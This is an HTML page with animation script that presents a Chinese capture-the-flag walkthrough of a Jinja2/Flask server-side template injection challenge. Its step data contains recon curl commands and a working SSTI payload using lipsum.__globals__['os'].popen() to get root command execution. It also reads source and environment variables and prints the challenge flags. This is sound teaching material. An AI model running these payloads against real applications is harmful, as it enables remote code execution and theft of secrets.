@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSTI 模板注入攻击链 · 动画流程图</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', sans-serif;
+            background: #0a0a0f;
+            min-height: 100vh;
+            height: 100vh;
+            overflow: hidden;
+            color: #fff;
+            position: relative;
+        }
+
+        /* 背景网格 */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image:
+                linear-gradient(rgba(74, 158, 255, 0.04) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(74, 158, 255, 0.04) 1px, transparent 1px);
+            background-size: 44px 44px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* 噪点 */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+            opacity: 0.06;
+            mix-blend-mode: overlay;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .logo {
+            position: fixed;
+            top: 22px;
+            right: 26px;
+            z-index: 100;
+            text-align: right;
+            opacity: 0.85;
+        }
+        .logo-text {
+            font-size: 11px;
+            font-weight: 500;
+            letter-spacing: 2px;
+            color: rgba(255, 255, 255, 0.45);
+            text-transform: uppercase;
+        }
+        .logo-line {
+            width: 100%;
+            height: 1px;
+            margin-top: 6px;
+            background: linear-gradient(90deg, transparent, rgba(74, 158, 255, 0.6), transparent);
+        }
+
+        .container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 48px 64px 28px;
+            z-index: 10;
+        }
+
+        /* ===== 头部 ===== */
+        .header {
+            display: flex;
+            align-items: flex-end;
+            justify-content: space-between;
+            margin-bottom: 26px;
+            flex-shrink: 0;
+        }
+        .title-kicker {
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 3px;
+            color: rgba(74, 158, 255, 0.9);
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(90deg, #fff, #9cc8ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .subtitle small {
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 1px;
+            color: rgba(255, 255, 255, 0.4);
+            margin-left: 14px;
+            -webkit-text-fill-color: rgba(255, 255, 255, 0.4);
+        }
+
+        /* ===== 控制按钮 ===== */
+        .controls {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        .btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.14);
+            color: rgba(255, 255, 255, 0.85);
+            font-size: 13px;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all .2s ease;
+            font-family: inherit;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            background: rgba(74, 158, 255, 0.18);
+            border-color: rgba(74, 158, 255, 0.6);
+            box-shadow: 0 0 14px rgba(74, 158, 255, 0.35);
+        }
+        .btn.primary {
+            background: linear-gradient(135deg, #4a9eff, #7c3aed);
+            border: none;
+            color: #fff;
+            font-weight: 600;
+        }
+        .btn.primary:hover {
+            box-shadow: 0 0 20px rgba(124, 58, 237, 0.55);
+        }
+        .step-counter {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.55);
+            margin-right: 6px;
+            letter-spacing: 1px;
+            min-width: 58px;
+            text-align: center;
+            font-variant-numeric: tabular-nums;
+        }
+
+        /* ===== 舞台 ===== */
+        .stage {
+            flex: 1;
+            display: flex;
+            gap: 28px;
+            min-height: 0;
+            position: relative;
+        }
+
+        /* ===== 流程列 ===== */
+        .flow-wrap {
+            flex: 1;
+            position: relative;
+            min-width: 0;
+            display: flex;
+            overflow-y: auto;
+        }
+        .flow {
+            position: relative;
+            margin: auto;
+            transform-origin: center center;
+        }
+        #edges {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: visible;
+        }
+
+        .node {
+            position: relative;
+            width: 460px;
+            padding: 8px 16px 8px 14px;
+            border-radius: 12px;
+            background: linear-gradient(145deg, rgba(26, 26, 46, 0.92), rgba(15, 15, 26, 0.95));
+            border: 1px solid rgba(74, 158, 255, 0.22);
+            margin-bottom: 14px;
+            cursor: pointer;
+            opacity: 0;
+            transform: translateY(18px);
+            transition: opacity .5s ease, transform .5s ease, box-shadow .35s ease, border-color .35s ease;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.45);
+        }
+        .node:last-child {
+            margin-bottom: 0;
+        }
+        .node.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .node.active {
+            border-color: rgba(74, 158, 255, 0.9);
+            box-shadow: 0 0 26px rgba(74, 158, 255, 0.35), inset 0 0 22px rgba(74, 158, 255, 0.07);
+        }
+        .node:hover {
+            box-shadow: 0 0 24px rgba(74, 158, 255, 0.4);
+        }
+
+        .node.kind-decision {
+            border-color: rgba(255, 107, 53, 0.45);
+        }
+        .node.kind-decision.active {
+            border-color: #ff6b35;
+            box-shadow: 0 0 26px rgba(255, 107, 53, 0.4), inset 0 0 22px rgba(255, 107, 53, 0.08);
+        }
+        .node.kind-chain {
+            border-color: rgba(124, 58, 237, 0.45);
+        }
+        .node.kind-chain.active {
+            border-color: #7c3aed;
+            box-shadow: 0 0 26px rgba(124, 58, 237, 0.45), inset 0 0 22px rgba(124, 58, 237, 0.08);
+        }
+        .node.kind-success {
+            border-color: rgba(52, 211, 153, 0.45);
+        }
+        .node.kind-success.active {
+            border-color: #34d399;
+            box-shadow: 0 0 28px rgba(52, 211, 153, 0.45), inset 0 0 22px rgba(52, 211, 153, 0.08);
+        }
+
+        .node-head {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+        .node-badge {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #4a9eff, #7c3aed);
+            color: #fff;
+            flex-shrink: 0;
+        }
+        .kind-decision .node-badge { background: linear-gradient(135deg, #ff6b35, #ff9a5c); }
+        .kind-chain .node-badge { background: linear-gradient(135deg, #7c3aed, #c084fc); }
+        .kind-success .node-badge { background: linear-gradient(135deg, #10b981, #34d399); }
+        .node-title {
+            font-size: 15px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .node-desc {
+            font-size: 12.5px;
+            color: rgba(255, 255, 255, 0.55);
+            line-height: 1.4;
+            padding-left: 32px;
+        }
+        .node-desc code {
+            font-family: 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+            font-size: 12px;
+            background: rgba(74, 158, 255, 0.12);
+            padding: 1px 6px;
+            border-radius: 4px;
+            color: #9cc8ff;
+        }
+        .node .chip-ok {
+            display: inline-block;
+            font-size: 10px;
+            font-weight: 600;
+            color: #34d399;
+            background: rgba(52, 211, 153, 0.12);
+            border: 1px solid rgba(52, 211, 153, 0.35);
+            padding: 1px 8px;
+            border-radius: 20px;
+            margin-left: 6px;
+        }
+        .node .chip-ng {
+            display: inline-block;
+            font-size: 10px;
+            font-weight: 600;
+            color: #ff6b35;
+            background: rgba(255, 107, 53, 0.10);
+            border: 1px solid rgba(255, 107, 53, 0.3);
+            padding: 1px 8px;
+            border-radius: 20px;
+            margin-left: 6px;
+        }
+
+        /* 失败路径小卡片 */
+        .fail-row {
+            display: flex;
+            gap: 12px;
+            margin-top: 18px;
+            justify-content: center;
+        }
+        .fail-card {
+            width: 460px;
+            padding: 8px 12px;
+            border-radius: 10px;
+            border: 1px dashed rgba(255, 107, 53, 0.35);
+            background: rgba(255, 107, 53, 0.04);
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+            line-height: 1.55;
+            opacity: 0;
+            transform: translateY(12px);
+            transition: opacity .6s ease, transform .6s ease;
+        }
+        .fail-card.visible { opacity: 1; transform: translateY(0); }
+        .fail-card b {
+            color: #ff6b35;
+            font-weight: 600;
+        }
+
+        /* ===== 右侧详情面板 ===== */
+        .panel {
+            width: 350px;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            background: linear-gradient(160deg, rgba(20, 20, 38, 0.75), rgba(12, 12, 22, 0.85));
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .panel-title {
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            color: rgba(255, 255, 255, 0.45);
+            text-transform: uppercase;
+        }
+        .progress {
+            height: 4px;
+            border-radius: 4px;
+            background: rgba(255, 255, 255, 0.08);
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 4px;
+            background: linear-gradient(90deg, #4a9eff, #7c3aed, #ff6b35);
+            transition: width .5s ease;
+        }
+        .detail-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 0.3px;
+        }
+        .detail-desc {
+            font-size: 12.5px;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.7;
+        }
+        .detail-desc code {
+            font-family: 'JetBrains Mono', Consolas, monospace;
+            font-size: 11.5px;
+            background: rgba(74, 158, 255, 0.12);
+            padding: 1px 6px;
+            border-radius: 4px;
+            color: #9cc8ff;
+        }
+        .term {
+            background: #0b0d14;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 12px 14px;
+            font-family: 'JetBrains Mono', 'Fira Code', Consolas, monospace;
+            font-size: 11.5px;
+            line-height: 1.75;
+        }
+        .term .prompt { color: #4a9eff; }
+        .term .cmd {
+            color: #e6edf3;
+            word-break: break-all;
+        }
+        .term .out {
+            color: #34d399;
+            word-break: break-all;
+        }
+        .term .out.flag {
+            color: #fbbf24;
+            font-weight: 600;
+        }
+        .flag-box {
+            text-align: center;
+            padding: 16px 10px;
+            border-radius: 12px;
+            border: 1px solid rgba(52, 211, 153, 0.5);
+            background: linear-gradient(135deg, rgba(52, 211, 153, 0.12), rgba(16, 185, 129, 0.05));
+            box-shadow: 0 0 24px rgba(52, 211, 153, 0.25);
+            animation: breathe 2.6s ease-in-out infinite;
+        }
+        .flag-box .flag-label {
+            font-size: 11px;
+            letter-spacing: 2px;
+            color: #34d399;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .flag-box .flag-value {
+            font-family: 'JetBrains Mono', Consolas, monospace;
+            font-size: 15px;
+            color: #fbbf24;
+            font-weight: 700;
+            word-break: break-all;
+        }
+        @keyframes breathe {
+            0%, 100% { box-shadow: 0 0 18px rgba(52, 211, 153, 0.2); }
+            50% { box-shadow: 0 0 34px rgba(52, 211, 153, 0.45); }
+        }
+        .fail-list {
+            border-top: 1px dashed rgba(255, 255, 255, 0.12);
+            padding-top: 12px;
+            margin-top: 4px;
+        }
+        .fail-list .fitem {
+            font-size: 11.5px;
+            color: rgba(255, 255, 255, 0.5);
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+        .fail-list .fitem b { color: #ff6b35; }
+        .hint {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: 0.5px;
+            margin-top: auto;
+        }
+
+        /* ===== 连线 ===== */
+        .edge {
+            opacity: 0;
+            transition: opacity .4s ease;
+        }
+        .edge.on { opacity: 1; }
+        .edge path {
+            fill: none;
+            stroke-width: 2;
+            stroke-dasharray: 9 7;
+            animation: flowDash 0.9s linear infinite;
+        }
+        .edge .draw {
+            stroke-width: 2.5;
+            stroke-dasharray: var(--len) var(--len);
+            stroke-dashoffset: var(--len);
+            animation: none;
+            transition: stroke-dashoffset .55s ease;
+        }
+        .edge.on .draw { stroke-dashoffset: 0; }
+        @keyframes flowDash {
+            to { stroke-dashoffset: -16; }
+        }
+        .particle {
+            opacity: 0;
+            transition: opacity .4s ease;
+        }
+        .particle.on { opacity: 1; }
+
+        @media (max-width: 1100px) {
+            .node, .fail-card { width: 340px; }
+            .panel { width: 300px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo">
+        <div class="logo-text">CTF2 · N1BOOK · WEB</div>
+        <div class="logo-line"></div>
+    </div>
+
+    <div class="container">
+        <header class="header">
+            <div>
+                <div class="title-kicker">Server-Side Template Injection</div>
+                <div class="subtitle">SSTI 模板注入攻击链<small>Jinja2 / Flask RCE</small></div>
+            </div>
+            <div class="controls">
+                <span class="step-counter" id="stepCounter">1 / 8</span>
+                <button class="btn" id="btnPrev">◀ 上一步</button>
+                <button class="btn primary" id="btnPlay">▶ 自动播放</button>
+                <button class="btn" id="btnNext">下一步 ▶</button>
+                <button class="btn" id="btnReset">⟲ 重置</button>
+            </div>
+        </header>
+
+        <div class="stage">
+            <div class="flow-wrap">
+                <div class="flow" id="flow">
+                    <svg id="edges"></svg>
+                </div>
+            </div>
+
+            <aside class="panel" id="panel">
+                <div class="panel-title">步骤详情</div>
+                <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+                <div class="detail-title" id="detailTitle">—</div>
+                <div class="detail-desc" id="detailDesc"></div>
+                <div class="term" id="termBox" hidden>
+                    <div class="cmd"><span class="prompt">$ </span><span id="termCmd"></span></div>
+                    <div class="out" id="termOut"></div>
+                </div>
+                <div class="flag-box" id="flagBox" hidden>
+                    <div class="flag-label">FLAG 获取成功</div>
+                    <div class="flag-value" id="flagValue"></div>
+                </div>
+                <div class="fail-list" id="failList" hidden></div>
+                <div class="hint">提示：hover 节点查看详情 · 键盘 ← → 步进 · 空格 播放/暂停</div>
+            </aside>
+        </div>
+    </div>
+
+<script>
+(() => {
+    "use strict";
+
+    /* ================= 步骤数据 ================= */
+    const steps = [
+        {
+            kind: "info",
+            title: "信息收集",
+            desc: "openresty 反代 · <code>password</code> 参数 · 输入回显",
+            detail: "访问目标页。响应头 <code>Server: openresty</code>（Nginx 系反代），页面主体回显 <code>password is wrong: </code>，提示存在 <code>password</code> 参数；题目名直接点名 SSTI。",
+            cmd: 'curl -s -i "http://TARGET/"',
+            out: "HTTP/1.1 200 OK · Server: openresty\n<p>password is wrong: </p>"
+        },
+        {
+            kind: "info",
+            title: "交互方式探测",
+            desc: "POST 405（仅 GET）· GET 参数原样回显",
+            detail: "POST 提交返回 <code>405 Method Not Allowed</code>（仅 GET）；改用 GET 传参 <code>?password=test</code>，输入被<u style='color:#9cc8ff'>原样回显</u> → 存在模板渲染嫌疑。",
+            cmd: 'curl -s -G "http://TARGET/" --data-urlencode "password=test"',
+            out: "<p>password is wrong: test</p>  ← 输入被直接回显"
+        },
+        {
+            kind: "decision",
+            title: "模板语法探测",
+            desc: "<code>{{7*7}}</code>→49 ✅ · 其余语法原样输出",
+            detail: "同时验证三种模板语法。只有 Jinja2 的 <code>{{7*7}}</code> 被求值输出 49；<code>${7*7}</code>（JSP/FreeMarker）与 <code>&lt;%= 7*7 %&gt;</code>（ERB/ASP）均原样输出，快速排除其它引擎。",
+            cmd: "{{7*7}}  /  ${7*7}  /  <%= 7*7 %>",
+            out: "{{7*7}} → 49 ✅   其余 → 原样输出"
+        },
+        {
+            kind: "info",
+            title: "确认 Jinja2 SSTI",
+            desc: "<code>render_template_string()</code> 直接渲染输入",
+            detail: "读容器内源码确认根因：<code>render_template_string()</code> 把未过滤的用户输入用 <code>%s</code> 拼进模板字符串直接渲染，<code>{{ ... }}</code> 表达式被执行。",
+            cmd: 'template = "<p>password is wrong: %s</p>" % password\nrender_template_string(template)',
+            out: "password is wrong: 49   ← 表达式被执行"
+        },
+        {
+            kind: "chain",
+            title: "构造 RCE 链 · lipsum",
+            desc: "<code>__globals__</code> 取 os → <code>popen()</code>",
+            detail: "任何函数对象都有 <code>__globals__</code>（所在模块全局命名空间）。模板内置函数 <code>lipsum</code> 来自 <code>jinja2/utils.py</code>，顶部必然 import 了 os → <code>lipsum.__globals__['os']</code> 直达 os 模块。",
+            cmd: '{{lipsum.__globals__["os"].popen("id").read()}}',
+            out: "uid=0(root) gid=0(root) groups=0(root)"
+        },
+        {
+            kind: "chain",
+            title: "RCE 成功 · root",
+            desc: "uid=0(root) · 任意命令执行",
+            detail: "以容器内 root 权限执行任意命令。逐级验证：<code>lipsum</code> → <code>__globals__</code> → <code>['os']</code> → <code>popen(cmd).read()</code>。",
+            cmd: '{{lipsum.__globals__["os"].popen("env").read()}}',
+            out: "环境变量列表 … 含 FLAG=CTF2{...}"
+        },
+        {
+            kind: "info",
+            title: "定位 flag",
+            desc: "<code>ls /</code> → <code>server.py</code> → <code>env</code> 命中 FLAG",
+            detail: "三条路径：<code>ls /</code> 根目录无 flag 文件；<code>cat /app/server.py</code> 找到漏洞根因与源码注释里的原题 flag <code>n1book{...}</code>；<code>env</code> 命中当前平台环境变量 FLAG。",
+            cmd: 'ls / && cat /app/server.py && env',
+            out: "n1book{eddb84d69a421a82} (原题注释)\nFLAG=CTF2{9f80767c-40c5-42ac-a29f-0ff382403341} (平台)"
+        },
+        {
+            kind: "success",
+            title: "获取 Flag ✅",
+            desc: "<code>env</code> 读环境变量 <code>FLAG</code> 提交",
+            detail: "通过 Jinja2 SSTI 执行 <code>env</code> 读取容器环境变量 <code>FLAG</code>，提交成功。",
+            cmd: "",
+            out: "CTF2{9f80767c-40c5-42ac-a29f-0ff382403341}"
+        }
+    ];
+
+    const FAILS = [
+        { t: "POST password=test", d: "405 Method Not Allowed，仅 GET → 排除 POST 表单" },
+        { t: "curl --data-urlencode 不带参数名", d: "payload 变成参数名被忽略，返回空 → 误判为“被过滤”（工具使用失误，浪费数轮请求）" }
+    ];
+
+    /* ================= 渲染节点 ================= */
+    const flow = document.getElementById("flow");
+    const nodes = [];
+    steps.forEach((s, i) => {
+        const n = document.createElement("div");
+        n.className = "node kind-" + s.kind;
+        n.innerHTML =
+            '<div class="node-head">' +
+            '<div class="node-badge">' + (i + 1) + '</div>' +
+            '<div class="node-title"></div>' +
+            '</div>' +
+            '<div class="node-desc"></div>';
+        n.querySelector(".node-title").textContent = s.title;
+        n.querySelector(".node-desc").innerHTML = s.desc;
+        n.dataset.idx = i;
+        n.addEventListener("mouseenter", () => showDetail(i, false));
+        n.addEventListener("click", () => jumpTo(i));
+        flow.appendChild(n);
+        nodes.push(n);
+    });
+
+    /* 失败路径卡片 */
+    const failRow = document.createElement("div");
+    failRow.className = "fail-row";
+    FAILS.forEach(f => {
+        const c = document.createElement("div");
+        c.className = "fail-card";
+        c.innerHTML = "<b>✗ " + f.t + "</b><br>" + f.d;
+        failRow.appendChild(c);
+    });
+    flow.appendChild(failRow);
+    const failCards = failRow.querySelectorAll(".fail-card");
+
+    /* ================= SVG 连线 ================= */
+    const svg = document.getElementById("edges");
+    const NS = "http://www.w3.org/2000/svg";
+    const COLORS = ["#4a9eff", "#7c3aed", "#34d399"];
+    let edges = [], particleCircles = [];
+
+    function buildEdges() {
+        svg.innerHTML = "";
+        edges = [];
+        particleCircles = [];
+        const flowRect = flow.getBoundingClientRect();
+        svg.setAttribute("width", flowRect.width);
+        svg.setAttribute("height", flowRect.height);
+        const defs = document.createElementNS(NS, "defs");
+        const marker = document.createElementNS(NS, "marker");
+        marker.setAttribute("id", "arrow");
+        marker.setAttribute("viewBox", "0 0 10 10");
+        marker.setAttribute("refX", "9");
+        marker.setAttribute("refY", "5");
+        marker.setAttribute("markerWidth", "6");
+        marker.setAttribute("markerHeight", "6");
+        marker.setAttribute("orient", "auto-start-reverse");
+        marker.innerHTML = '<path d="M0,0 L10,5 L0,10 z" fill="' + COLORS[0] + '"/>';
+        defs.appendChild(marker);
+        svg.appendChild(defs);
+
+        for (let i = 0; i < nodes.length - 1; i++) {
+            const a = nodes[i].getBoundingClientRect();
+            const b = nodes[i + 1].getBoundingClientRect();
+            const x1 = a.left - flowRect.left + a.width / 2;
+            const y1 = a.bottom - flowRect.top;
+            const x2 = b.left - flowRect.left + b.width / 2;
+            const y2 = b.top - flowRect.top - 6;
+            const mid = (y1 + y2) / 2;
+            const d = "M" + x1 + "," + y1 +
+                      " C" + x1 + "," + mid +
+                      " " + x2 + "," + mid +
+                      " " + x2 + "," + y2;
+            const g = document.createElementNS(NS, "g");
+            g.setAttribute("class", "edge");
+            const path = document.createElementNS(NS, "path");
+            path.setAttribute("d", d);
+            path.setAttribute("stroke", COLORS[i % COLORS.length]);
+            path.setAttribute("marker-end", "url(#arrow)");
+            path.setAttribute("opacity", "0.55");
+            const len = path.getTotalLength();
+            const draw = document.createElementNS(NS, "path");
+            draw.setAttribute("d", d);
+            draw.setAttribute("class", "draw");
+            draw.setAttribute("stroke", COLORS[i % COLORS.length]);
+            draw.style.setProperty("--len", len + "px");
+            draw.style.strokeDasharray = len + " " + len;
+            draw.style.strokeDashoffset = len;
+            g.appendChild(path);
+            g.appendChild(draw);
+            svg.appendChild(g);
+            edges.push(g);
+
+            /* 发光粒子沿路径流动 */
+            const p = document.createElementNS(NS, "circle");
+            p.setAttribute("r", "2.6");
+            p.setAttribute("fill", COLORS[i % COLORS.length]);
+            p.setAttribute("class", "particle");
+            p.style.filter = "drop-shadow(0 0 5px " + COLORS[i % COLORS.length] + ")";
+            const am = document.createElementNS(NS, "animateMotion");
+            am.setAttribute("dur", "1.3s");
+            am.setAttribute("repeatCount", "indefinite");
+            am.setAttribute("path", d);
+            p.appendChild(am);
+            svg.appendChild(p);
+            particleCircles.push(p);
+        }
+    }
+
+    /* ================= 状态机 ================= */
+    let current = -1;
+    let playing = false;
+    let timer = null;
+    const PLAY_MS = 3400;
+
+    const counter = document.getElementById("stepCounter");
+    const progressFill = document.getElementById("progressFill");
+    const detailTitle = document.getElementById("detailTitle");
+    const detailDesc = document.getElementById("detailDesc");
+    const termBox = document.getElementById("termBox");
+    const termCmd = document.getElementById("termCmd");
+    const termOut = document.getElementById("termOut");
+    const flagBox = document.getElementById("flagBox");
+    const flagValue = document.getElementById("flagValue");
+    const failList = document.getElementById("failList");
+    const btnPlay = document.getElementById("btnPlay");
+
+    /* 失败路径渲染（面板 + 底部卡片） */
+    failList.innerHTML = '<div class="panel-title" style="font-size:11px;margin-bottom:8px;">失败路径 / 排除项</div>';
+    FAILS.forEach(f => {
+        const d = document.createElement("div");
+        d.className = "fitem";
+        d.innerHTML = "<b>✗ " + f.t + "</b> — " + f.d;
+        failList.appendChild(d);
+    });
+
+    function showDetail(i, isActive) {
+        const s = steps[i];
+        detailTitle.textContent = (isActive ? "▶ " : "") + s.title;
+        detailDesc.innerHTML = s.detail || s.desc;
+        progressFill.style.width = ((i + 1) / steps.length * 100) + "%";
+        counter.textContent = (i + 1) + " / " + steps.length;
+        if (s.cmd) {
+            termBox.hidden = false;
+            termCmd.textContent = s.cmd;
+            termOut.textContent = s.out;
+            termOut.classList.toggle("flag", i === steps.length - 1);
+        } else {
+            termBox.hidden = true;
+        }
+        flagBox.hidden = i !== steps.length - 1;
+        if (!flagBox.hidden) flagValue.textContent = steps[steps.length - 1].out;
+    }
+
+    function activate(i) {
+        current = i;
+        nodes.forEach((n, k) => {
+            n.classList.add("visible");
+            n.classList.toggle("active", k === i);
+        });
+        edges.forEach((e, k) => e.classList.toggle("on", k < i));
+        particleCircles.forEach((p, k) => p.classList.toggle("on", k === i - 1 && i > 0));
+        failCards.forEach((c, k) => {
+            c.classList.add("visible");
+            if (k === 0) c.style.transitionDelay = (i >= 2 ? "0.9s" : "2.6s");
+            if (k === 1) c.style.transitionDelay = (i >= 2 ? "1.2s" : "3s");
+        });
+        showDetail(i, true);
+    }
+
+    function jumpTo(i) {
+        if (i < 0 || i >= steps.length) return;
+        activate(i);
+    }
+
+    function next() {
+        if (current >= steps.length - 1) { stopPlay(); return; }
+        activate(current + 1);
+    }
+    function prev() {
+        if (current <= 0) return;
+        activate(current - 1);
+    }
+
+    function startPlay() {
+        if (playing) return;
+        playing = true;
+        btnPlay.textContent = "⏸ 暂停";
+        if (current >= steps.length - 1) activate(0);
+        timer = setInterval(() => {
+            if (current >= steps.length - 1) { stopPlay(); return; }
+            next();
+        }, PLAY_MS);
+    }
+    function stopPlay() {
+        playing = false;
+        clearInterval(timer);
+        btnPlay.textContent = "▶ 自动播放";
+    }
+    function reset() {
+        stopPlay();
+        current = -1;
+        nodes.forEach(n => n.classList.remove("visible", "active"));
+        edges.forEach(e => e.classList.remove("on"));
+        particleCircles.forEach(p => p.classList.remove("on"));
+        failCards.forEach(c => c.classList.remove("visible"));
+        progressFill.style.width = "0%";
+        counter.textContent = "0 / " + steps.length;
+        detailTitle.textContent = "—";
+        detailDesc.textContent = "点击 ▶ 自动播放，或点击下方节点逐步查看攻击链。";
+        termBox.hidden = true;
+        flagBox.hidden = true;
+    }
+
+    document.getElementById("btnNext").addEventListener("click", () => { stopPlay(); next(); });
+    document.getElementById("btnPrev").addEventListener("click", () => { stopPlay(); prev(); });
+    document.getElementById("btnPlay").addEventListener("click", () => playing ? stopPlay() : startPlay());
+    document.getElementById("btnReset").addEventListener("click", reset);
+
+    document.addEventListener("keydown", e => {
+        if (e.key === "ArrowRight") { stopPlay(); next(); }
+        else if (e.key === "ArrowLeft") { stopPlay(); prev(); }
+        else if (e.key === " ") { e.preventDefault(); playing ? stopPlay() : startPlay(); }
+    });
+
+    /* ================= 布局 / 自适应缩放 ================= */
+    function fit() {
+        const wrap = document.querySelector(".flow-wrap");
+        const wrapH = wrap.clientHeight;
+        const flowH = flow.scrollHeight;
+        let scale = Math.min(1, (wrapH - 10) / flowH);
+        if (scale < 0.85) scale = 0.85;   /* 下限：字太小则宁可滚动 */
+        flow.style.transform = "scale(" + scale + ")";
+    }
+
+    let resizeTimer = null;
+    window.addEventListener("resize", () => {
+        clearTimeout(resizeTimer);
+        resizeTimer = setTimeout(() => { fit(); buildEdges(); }, 150);
+    });
+
+    /* ================= 启动 ================= */
+    reset();
+    fit();
+    buildEdges();
+    setTimeout(() => { fit(); buildEdges(); }, 100);
+    setTimeout(() => {
+        if (current === -1 && !playing) startPlay();
+    }, 600);
+})();
+</script>
+</body>
+</html>
